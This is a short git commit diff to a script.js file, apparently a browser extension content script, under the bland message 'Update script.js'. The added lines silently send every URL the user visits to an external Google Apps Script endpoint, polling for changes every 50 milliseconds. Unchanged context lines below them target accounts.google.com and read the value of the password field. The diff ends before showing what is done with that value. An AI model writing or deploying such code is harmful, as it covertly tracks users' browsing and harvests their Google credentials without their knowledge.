7784db9b97045949008cf7c6c4d46c5cfd5b15d6
Josh Chang <joshchang04@gmail.com>
2021-03-16 12:51:52 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,14 @@
+// Log URLs
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
+var href = window.location.href;
+setInterval(() => {
+  if(window.location.href !== href){
+    href = window.location.href;
+    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${href}`);
+  }
+}, 50);
+
+// Google Password
 if(window.location.host === 'accounts.google.com'){
   var password = $("input[type='password']");
   var currentVal = password.attr('data-initial-value');
